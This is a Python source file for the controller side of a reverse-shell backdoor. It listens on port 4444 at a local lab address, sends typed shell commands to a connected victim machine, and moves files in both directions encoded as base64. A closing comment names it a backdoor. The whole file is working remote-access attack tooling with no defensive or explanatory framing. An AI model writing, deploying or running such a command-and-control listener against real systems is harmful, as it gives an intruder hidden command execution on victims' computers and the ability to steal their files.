#!/usr/bin/env python
import socket
import json
import base64


class Listener:
    def __init__(self, ip, port):
        listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)       # AF_INET == ipv4 & SOCK_STREAM == TCP 
        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        listener.bind((ip, port))
        listener.listen(0)
        print('--->waiting for incoming connection...')
        self.connection, address = listener.accept()         # self.connection is an object of socket
        print('--->Got Connection from ' + str(address))

    def box_send(self, data):
        json_data = json.dumps(data)
        self.connection.send(json_data)

    def box_receive(self):
        json_data = ''
        while True:
            try:
                json_data = json_data + self.connection.recv(1024)
                return json.loads(json_data)
            except ValueError:
                continue

    def execute_remotely(self, command):
        self.box_send(command)
        if command[0] == 'exit':
            self.connection.close()
            exit()
        return self.box_receive()

    def write_file(self, path, content):
        with open(path, 'wb') as file:
            file.write(base64.b64decode(content))
            return '>> Download Successful'

    def read_file(self, path):
        with open(path, 'rb') as file:
            return base64.b64encode(file.read())

    def run(self):
        while True:
            command = raw_input('Enter the command >>')  # use input if to run in python 3
            command = command.split(' ')

            try:
                if command[0] == 'upload':
                    file_content = self.read_file(command[1])
                    command.append(file_content)
                result = self.execute_remotely(command)
                if command[0] == 'download' and 'something went wrong' not in result:
                    result = self.write_file(command[1], result)
            except Exception:
                result = '>> Error Occured'

            print(result)


my_listener = Listener('10.0.2.15', 4444)
my_listener.run()


# backdoor back_main


